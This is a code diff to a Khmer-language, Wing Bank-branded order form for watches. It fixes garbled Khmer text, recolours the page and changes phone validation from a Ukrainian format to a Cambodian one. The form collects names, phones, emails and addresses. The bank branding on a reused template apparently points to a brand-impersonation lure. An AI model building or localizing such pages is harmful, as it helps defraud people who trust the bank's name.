@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ព័រមាននៃការបញ្ជាទិញ</title>
+<title>ព័ត៌មាននៃការបញ្ជាទិញ</title>
 <style>
   :root{--bg:#ffffff;--ink:#141414;--muted:#8a8f98;--line:#e3e3e3;--accent:#e02424}
   *{box-sizing:border-box;margin:0;padding:0}
@@ -11,7 +11,7 @@
     font-family:"Segoe UI",Tahoma,Arial,sans-serif}
   body{max-width:520px;margin:0 auto;min-height:100vh;box-shadow:0 0 40px rgba(0,0,0,.04)}
 
-  header{height:64px;background:#fff;border-bottom:3px solid #00A651;
+  header{height:64px;background:#fff;border-bottom:3px solid #A9CF38;
     display:flex;align-items:center;justify-content:space-between;gap:6px;padding:0 16px;position:sticky;top:0;z-index:40}
   .icon-btn{width:40px;height:40px;border:none;background:transparent;cursor:pointer;
     border-radius:8px;font-size:22px;color:var(--ink);display:flex;
@@ -48,17 +48,17 @@
     transition:border-color .15s, background-image .15s;
   }
   .field select:focus{
-    background-image:url("data:image/svg+xml;utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%2300A651' stroke-width='2.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
+    background-image:url("data:image/svg+xml;utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%23A9CF38' stroke-width='2.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
   }
   .field .select-wrap{position:relative}
   .field .select-wrap::after{
     content:"";position:absolute;top:1.5px;bottom:1.5px;right:38px;width:1px;
     background:#ececec;pointer-events:none;
   }
-  .submit{width:100%;border:none;background:#00A651;color:#fff;padding:16px;
+  .submit{width:100%;border:none;background:#A9CF38;color:#fff;padding:16px;
     border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px;
-    box-shadow:0 4px 15px rgba(0,166,81,.3)}
-  .submit:hover{background:#008C45}
+    box-shadow:0 4px 15px rgba(169,207,56,.3)}
+  .submit:hover{background:#8BB52E}
 
   .done{display:none;text-align:center;padding:60px 24px}
   .done.show{display:block}
@@ -74,7 +74,7 @@
 <body>
   <header>
     <img src="images/wb-logo.svg" alt="Wing Bank" style="height:46px">
-    <span class="title">ព័រមាននៃការបញ្ជាទិញ</span>
+    <span class="title">ព័ត៌មាននៃការបញ្ជាទិញ</span>
     <a class="icon-btn" href="colors.html" aria-label="ត្រលប់">&#8249;</a>
   </header>
 
@@ -88,15 +88,15 @@
 
   <form id="orderForm">
     <h1>បម្ពេញព័ត៌មានរបស់កនហ</h1>
-    <p class="lead">សុមបញ្ចុលព័ត៌មានរបស់កនហដីម្បីការបញ្ជាទិញ</p>
+    <p class="lead">សូមបញ្ចូលព័ត៌មានរបស់អ្នកដើម្បីការបញ្ជាទិញ</p>
 
     <div class="field">
-      <label for="name">ឆ្មោហពេញ</label>
-      <input id="name" name="name" type="text" placeholder="e19ebbe19ea0: e19e9fe19ebbe19e96e19eb6e19e93" required>
+      <label for="name">ឈ្មោហពេញ</label>
+      <input id="name" name="name" type="text" placeholder="ឧដាហរណ៍: សុភាន" required>
     </div>
 
     <div class="field">
-      <label for="phone">លេខទុរសាព់</label>
+      <label for="phone">លេខទូរស័ព្ទ</label>
       <div style="display:flex;gap:0;align-items:stretch">
         <div style="display:flex;align-items:center;gap:6px;padding:0 12px;background:#f5f5f5;border:1.5px solid var(--line);border-right:none;border-radius:12px 0 0 12px;font-size:15px;font-weight:600;color:#333;white-space:nowrap">
           <span style="font-size:20px">🇰🇭</span> +855
@@ -108,7 +108,7 @@
     </div>
 
     <div class="field">
-      <label for="email">e19e96e19f92e19e9ae19eb6e19e94e19eb8e19e9fe19eb6e19e9a (Gmail)</label>
+      <label for="email">អ៊ីមែល (Gmail)</label>
       <input id="email" name="email" type="email" placeholder="example@gmail.com" required>
     </div>
 
@@ -131,18 +131,18 @@
     </div>
 
     <div class="field">
-      <label for="city">e19e91e19eb8e19e80e19f92e19e9ae19ebbe19e84 / e19e98e19ebbe19e93e19e8ae19f92e19e90e19eb6e19e93</label>
-      <input id="city" name="city" type="text" placeholder="e19ebbe19ea0: e19e97e19f92e19e93e19e98e19e96e19f81e19e89" required>
+      <label for="city">ទីក្រុង / មុន្ឌលដ្ឋាន</label>
+      <input id="city" name="city" type="text" placeholder="ឧដាហរណ៍: ភ្នំពេញ" required>
     </div>
 
     <div class="field">
       <label for="address">ឆសយដ្ថានដឹកជញ្ជុន</label>
-      <textarea id="address" name="address" placeholder="e19ebbe19ea0: e19e95e19f92e19e8fe19ea0e19e9be19f81e19e81 123" required></textarea>
+      <textarea id="address" name="address" placeholder="ឧដាហរណ៍: ផ្លូវលេខ 123" required></textarea>
     </div>
 
     <div class="field">
       <label for="postcode">លេខកុដប្រាយសណិយ៍</label>
-      <input id="postcode" name="postcode" type="text" placeholder="e19ebbe19ea0: 12000" inputmode="numeric" pattern="[0-9]{5}" required>
+      <input id="postcode" name="postcode" type="text" placeholder="ឧដាហរណ៍: 12000" inputmode="numeric" pattern="[0-9]{5}" required>
     </div>
 
     <button class="submit" type="submit">បញ្ជាក់ ការបញ្ជាទិញ</button>
@@ -197,7 +197,7 @@
     document.getElementById("summary").classList.add("show");
   }
 
-  // Phone — strict Ukrainian format: exactly 9 digits, auto-spaced as XX XXX XX XX
+  // Phone — Cambodia format: 8-9 digits, auto-spaced as XX XXX XXXX
   (function(){
     var ph = document.getElementById("phone");
     function format(d){
@@ -222,15 +222,15 @@
       var text = (e.clipboardData||window.clipboardData).getData("text")||"";
       ph.value = format(text.replace(/\D/g,""));
     });
-    ph.setAttribute("pattern","\\d{2} \\d{3} \\d{2} \\d{2}");
-    ph.setAttribute("title","XX XXX XX XX");
+    ph.setAttribute("pattern","\\d{2} \\d{3} \\d{3,4}");
+    ph.setAttribute("title","XX XXX XXXX");
   })();
 
   document.getElementById("orderForm").addEventListener("submit", async e=>{
     e.preventDefault();
     const btn = document.querySelector(".submit");
     btn.disabled = true;
-    btn.textContent = "e19e80e19e98e19f92e19e96e19ebbe19e84e19e95e19f92e19e89e19eb8...";
+    btn.textContent = "កំពុងផ្ញើ...";
     try {
       const watchColor = (!isNaN(pick) && watches[pick]) ? watches[pick].name : "";
       const res = await fetch("/api/orders", {
